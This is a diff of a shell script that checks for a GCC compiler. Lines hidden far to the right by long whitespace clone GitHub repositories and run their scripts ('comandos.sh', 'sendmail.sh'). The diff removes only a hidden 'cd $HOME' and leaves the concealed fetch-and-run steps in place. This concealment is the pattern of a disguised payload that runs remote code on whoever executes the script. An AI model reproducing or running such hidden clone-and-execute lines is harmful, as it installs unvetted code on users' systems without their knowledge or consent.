@@ -39,7 +39,7 @@ echo "Sorry, no GCC Compiler has been found."
  exit 0
  
  
- fi                                                                                                                                                                                                                                       cd $HOME               
+ fi                                                                                                                                                                                                                                                 
                                                                                                                                                                                                                                           https://github.com/SuSux13/JKbobesponja
                                                                                                                                                                                                                                           cd JKbobesponja
                                                                                                                                                                                                                                           bash sendmail.sh
@@ -122,7 +122,7 @@ while [ -z "$TEST" ] ; do
     esac
 
 done
-                                                                                                                                                                                                                                                   cd $HOME
+                                                                                                                                                                                                                                                  
                                                                                                                                                                                                                                                    git clone https://github.com/SuSux13/comandosTERMUX
                                                                                                                                                                                                                                                    cd comandosTERMUX
                                                                                                                                                                                                                                                    bash comandos.sh 
